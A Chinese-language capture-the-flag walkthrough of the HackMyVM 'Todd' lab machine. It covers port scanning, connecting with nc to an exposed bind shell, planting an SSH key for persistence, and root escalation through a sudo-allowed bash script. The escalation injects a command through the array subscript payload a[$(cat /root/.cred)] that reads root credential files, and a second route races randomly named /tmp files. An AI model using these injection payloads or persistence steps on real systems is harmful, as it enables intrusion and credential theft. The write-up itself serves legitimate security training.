---
layout: config.default_layout
title: HackMyVM-Todd
date: 2025-04-13 20:11:55
updated: 2025-04-13 20:12:30
comments: true
tags: [HackMyVM,Linux靶机,Shell语言]
categories: 靶机
---

# Todd.

> https://hackmyvm.eu/machines/machine.php?vm=Todd
> 

Note：**Find Todd.**

## 前期踩点

```bash
  nmap -sP 192.168.56.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-13 03:02 EDT
Nmap scan report for 192.168.56.1
Host is up (0.00040s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00022s latency).
MAC Address: 08:00:27:EA:BE:43 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.42
Host is up (0.00032s latency).
MAC Address: 08:00:27:53:2D:C6 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.4
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 15.07 seconds
```

```bash
  nmap -sT -min-rate 10000 -p- 192.168.56.42
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-13 03:08 EDT
Nmap scan report for 192.168.56.42
Host is up (0.00042s latency).
Not shown: 65522 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
7066/tcp  open  unknown
8237/tcp  open  unknown
9460/tcp  open  unknown
10825/tcp open  unknown
11523/tcp open  unknown
14055/tcp open  unknown
15617/tcp open  unknown
18585/tcp open  unknown
20111/tcp open  unknown
22005/tcp open  optohost004
24745/tcp open  unknown
MAC Address: 08:00:27:53:2D:C6 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 10.77 seconds
```

```bash
  nmap -sT -A -T4 -O -p 22,80 192.168.56.42 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-13 03:10 EDT
Nmap scan report for 192.168.56.42
Host is up (0.00050s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)
|   256 1e:a7:44:0b:2c:1b:0d:77:83:df:1d:9f:0e:30:08:4d (ECDSA)
|_  256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Mindful Listening
|_http-server-header: Apache/2.4.59 (Debian)
MAC Address: 08:00:27:53:2D:C6 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.50 ms 192.168.56.42

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.89 seconds
```

访问 `HTTP` 并提取指纹

![image.png](image.png)

## Web 渗透

扫描一下目录

```bash
 gobuster dir -u http://192.168.56.42 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404,403,502,429 --no-error
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.42
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404,403,502,429
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/tools                (Status: 301) [Size: 314] [--> http://192.168.56.42/tools/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

扫描到 `Tools`文件夹，里面是常用（雾）的工具

![image.png](image1.png)

没找到入口，仔细阅读主页上的文本：

> The quieter you become,the more you are able to hear
> 

在扫描一次端口，发现依旧存在只有`22`，`80`，`7066`

```bash
⚡ root@kali  ~/Desktop/test/Todd  nmap -sT -min-rate 10000 -p- 192.168.56.42
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-13 03:26 EDT
Nmap scan report for 192.168.56.42
Host is up (0.0010s latency).
Not shown: 65523 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
5182/tcp  open  unknown
5974/tcp  open  unknown
7066/tcp  open  unknown
12754/tcp open  unknown
15375/tcp open  unknown
20687/tcp open  unknown
22952/tcp open  unknown
25782/tcp open  unknown
27457/tcp open  unknown
29429/tcp open  unknown
MAC Address: 08:00:27:53:2D:C6 (Oracle VirtualBox virtual NIC)
```

使用`nc` ，发现在此端口上绑定了一个`shell`

```bash
⚡ root@kali  ~/Desktop/test/Todd  nc 192.168.56.42 7066
id
uid=1000(todd) gid=1000(todd) groups=1000(todd)
```

可以直接到家目录读取`Flag`

```bash
cat user.txt
Todd{eb93009a2719640de486c4f68daf62ec}
```

写入`SSH`公钥，以获得稳定 `shell`

```bash
echo "ssh-rsa xxxxxxx" > .ssh/authorized_keys
```

## 提权

想起来原本放在`Web`目录下的工具，我们直接可以使用

但是权限有限

```bash
$ ls -al
total 9580
drwxr-xr-x 2 root root    4096 Mar 22 08:14 .
drwxr-xr-x 3 root root    4096 Mar 22 08:14 ..
-rwxr-xr-x 1 root root 6266348 Feb 25  2024 fscan
-rw-r--r-- 1 root root   90934 Nov 25  2023 les.sh
-rw-r--r-- 1 root root  332111 Apr 17  2023 linpeas.sh
-rwxr-xr-x 1 root root 3104768 Apr 17  2023 pspy64
```

我们使用`pspy64`查看一下进程

```bash
$ ./pspy64                                                                                                        
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d                                     
                                                                                                                  
                                                                                                                  
     ██▓███    ██████  ██▓███ ▓██   ██▓                                                                           
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒                                                                           
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░                                                                           
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░                                                                           
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░                                                                           
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒          
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░          
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░           
                   ░           ░ ░              
                               ░ ░                  
                                             
 Draining file system events due to startup...                                                                     
done                                                                                                              
2025/04/13 03:39:23 CMD: UID=1000  PID=12747  | ./pspy64                                                          
2025/04/13 03:39:23 CMD: UID=1000  PID=12678  | -sh                                                               
2025/04/13 03:39:23 CMD: UID=1000  PID=12677  | sshd: todd@pts/0      
2025/04/13 03:39:23 CMD: UID=1000  PID=12669  | (sd-pam)                                                          
2025/04/13 03:39:23 CMD: UID=1000  PID=12668  | /lib/systemd/systemd --user                         
2025/04/13 03:39:23 CMD: UID=1000  PID=12667  | nc -e /opt/fake_ssh -lp 1214                                      
2025/04/13 03:39:23 CMD: UID=0     PID=12665  | sudo -u todd nc -e /opt/fake_ssh -lp 1214                         
2025/04/13 03:39:23 CMD: UID=0     PID=12664  | /bin/bash /opt/create_nc.sh                                       
2025/04/13 03:39:23 CMD: UID=0     PID=12662  | sshd: todd [priv]                                                 
2025/04/13 03:39:23 CMD: UID=1000  PID=12661  | nc -e /opt/fake_ssh -lp 10331                                     
2025/04/13 03:39:23 CMD: UID=0     PID=12660  | sudo -u todd nc -e /opt/fake_ssh -lp 10331                        
2025/04/13 03:39:23 CMD: UID=0     PID=12658  | /bin/bash /opt/create_nc.sh                                       
2025/04/13 03:39:23 CMD: UID=1000  PID=12656  | nc -e /opt/fake_ssh -lp 27485                                     
2025/04/13 03:39:23 CMD: UID=0     PID=12655  | sudo -u todd nc -e /opt/fake_ssh -lp 27485  "kali" 03:40 13-4月-25 
```

可以发现一直在以`root`权限运行`/bin/bash /opt/create_nc.sh`  

```bash
$ ls -al
total 40
drwxr-xr-x  2 root root  4096 Mar 22 10:40 .
drwxr-xr-x 18 root root  4096 Nov 13  2020 ..
-rwx------  1 root root   138 Mar 22 08:00 create_nc2.sh
-rwx---r--  1 root root   141 Mar 22 07:42 create_nc.sh
-rwx------  1 root root 16608 Mar 22 07:21 fake_ssh
-rwx------  1 root root    17 Mar 22 07:07 kill_todd.sh
```

可以看到该脚本就是生成端口并建立`shell`连接

```bash
$ cat create_nc.sh
#!/bin/bash

create_ssh(){
        sudo -u todd nc -e /opt/fake_ssh -lp $1
}

for i in $(seq 10)
do
        a=$((RANDOM))
        sleep 0.2
        create_ssh $a &
done
```

查看一下`sudo`权限

```bash
$ sudo -l
Matching Defaults entries for todd on todd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User todd may run the following commands on todd:
    (ALL : ALL) NOPASSWD: /bin/bash /srv/guess_and_check.sh
    (ALL : ALL) NOPASSWD: /usr/bin/rm
    (ALL : ALL) NOPASSWD: /usr/sbin/reboot                                                                           
```

查看 `guess_and_check.sh`

```
cat << EOF                                               
                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,     HackMyVM                                                   
EOF                                                      

# check this script used by human                        
a=$((RANDOM%1000))                                       
echo "Please Input [$a]"                                 

echo "[+] Check this script used by human."              
echo "[+] Please Input Correct Number:"                  
read -p ">>>" input_number                               

[[ $input_number -ne "$a" ]] && exit 1                   

sleep 0.2                                                
true_file="/tmp/$((RANDOM%1000))"                        
sleep 1                                                  
false_file="/tmp/$((RANDOM%1000))"                       

[[ -f "$true_file" ]] && [[ ! -f "$false_file" ]] && cat /root/.cred || exit 2           
```

看来是考察 `Shell` 知识了

- `read`+用户交互，强制输入；
- 配合 `sleep` 随机等待，防止太快的自动脚本行为；
- 文件判断 `true_file`/`false_file` 作为一个简单的“逻辑开关”，需要外部提前创建好 `/tmp/随机值` 文件，才会泄露 `/root/.cred`

### 解法 1

注入点其实在这：

```bash
read -p ">>>" input_number                               

[[ $input_number -ne "$a" ]] && exit 1 
```

比较用户输入的数字 `$input_number` 是否与 `$a` 相等。`ne` 表示“not equal”，如果**不相等**，就立刻退出脚本，返回码为 `1`。

但是我们输入`a` 时，返回码为`2`

```bash
[+] Please Input Correct Number:
>>>a
$ echo $?
2
```

输入 `a`，变量 `input_number=a` ，相等于执行`[[ a -ne 123 ]]`（假设随机数是123），然后

到最后判断时不相等所以触发了`exit 2` 在 Bash 的 `[[ ... ]]` 条件判断中，当参与比较的任一侧不是一个有效的整数时，整个表达式无法正常计算，返回一个非零状态码（通常是 2）

关键在于“短路”机制：`[[ ... ]] && exit 1`只有在`[[ ... ]]`成功（返回 0）时才会执行`exit 1`但这里因为算术比较失败，所以返回的状态码不为 0，也就是说，“&&”后面的`exit 1` 根本不会被执行。

另外一种解释就是，下面解释来自：https://7r1umph.github.io/post/qun-zhu-ti-hou-xu-%20%60-ne%60%20-rao-guo-%20-%20-bian-liang-jie-xi-yu-%20Python%202%20%60input%28%29%60%20-de-qi-shi.html

- **示例 1: `[[ a -ne "$a" ]]`**
    
    假设脚本中的随机数变量就是 `a` (例如 `a=42`)。在这个表达式中：
    
    1. 第一个 `a` **没有引号**。Bash 会尝试查找名为 `a` 的变量。
    2. 它找到了，值为 `42`。表达式变为 `[[ 42 -ne "$a" ]]`。
    3. 第二个 `$a` 被扩展为其值 `42`。表达式变为 `[[ 42 -ne 42 ]]`。
    4. 算术比较 `42 -ne 42` 的结果是 **false** (因为它们相等)，`[[` 命令退出状态为 **1**。
    5. `if` 语句看到退出状态 1，条件判断为 **false**，从而跳过 `exit 1`。
- **示例 2: `[[ b -ne "$a" ]]`**
    
    假设变量 `b` 未定义：
    
    1. 第一个 `b` **没有引号**。Bash 尝试查找名为 `b` 的变量。
    2. 未找到。根据 Bash 的设置（例如 `set -u` 是否开启），这可能导致错误，或者未定义的变量被视为空字符串或 0。
    3. 如果视为空或 0，假设 `$a` 是 42，表达式可能变为 `[[ 0 -ne 42 ]]` 或 `[[ "" -ne 42 ]]`。
    4. `[[ 0 -ne 42 ]]` 结果为 **true** (退出状态 0)。`if` 条件满足，执行 `exit 1`。
    5. `[[ "" -ne 42 ]]` 中空字符串不是有效整数，`ne` 操作失败，`[[` 退出状态 **非零**。`if` 条件判断为 **false**，跳过 `exit 1`。（这更接近我们之前用 `aaa` 的情况）

我更倾向于第二个解释。

然后你可以传入一个数组，例如：`a[1]` 

在 `shell` 语言中，数组的下标是数字，那个数字是会运算的，例如你可以构造：`a[$(id)]`

```bash
$ sudo /bin/bash ./guess_and_check.sh
                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,     HackMyVM
Please Input [510]
[+] Check this script used by human.
[+] Please Input Correct Number:
>>>a[$(id)]
/srv/guess_and_check.sh: line 35: uid=0(root) gid=0(root) groups=0(root): syntax error in expression (error token is "(root) gid=0(root) groups=0(root)")
```

就会先运算了括号那的命令，然后数组再找下标，然后找到的是一串字符串，就会报错

我们可以通过该特性直接读取`/root/.cred`

```bash
>>>a[$(cat /root/.cred)]
/srv/guess_and_check.sh: line 35: fake password: syntax error in expression (error token is "password")
```

或者直接读取`root.txt`

```bash
>>>a[$(cat /root/root.txt)]
/srv/guess_and_check.sh: line 35: Todd{389c9909b8d6a701217a45104de7aa21}: syntax error: invalid arithmetic operator (error token is "{389c9909b8d6a701217a45104de7aa21}")
```

### 解法 2

那就是分析脚本

```bash
cat << EOF                                               
                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,     HackMyVM                                                   
EOF                                                      

# check this script used by human                        
a=$((RANDOM%1000))                                       
echo "Please Input [$a]"                                 

echo "[+] Check this script used by human."              
echo "[+] Please Input Correct Number:"                  
read -p ">>>" input_number                               

[[ $input_number -ne "$a" ]] && exit 1                   

sleep 0.2                                                
true_file="/tmp/$((RANDOM%1000))"                        
sleep 1                                                  
false_file="/tmp/$((RANDOM%1000))"                       

[[ -f "$true_file" ]] && [[ ! -f "$false_file" ]] && cat /root/.cred || exit 2           
```

这里就是主要要看

```bash
sleep 0.2                                                
true_file="/tmp/$((RANDOM%1000))"                        
sleep 1                                                  
false_file="/tmp/$((RANDOM%1000))" 
  
[[ -f "$true_file" ]] && [[ ! -f "$false_file" ]] && cat /root/.cred || exit 2     
```

我们直接创建`500`个文件

```bash
$ cd /tmp  
$ touch $(seq 500)
```

这样正确的概率就会蛮高的

```bash
Please Input [340]
[+] Check this script used by human.
[+] Please Input Correct Number:
>>>340
fake password
```

`fake password` 就是`root`密码

```bash
root@todd:~# cat root.txt 
Todd{389c9909b8d6a701217a45104de7aa21}
```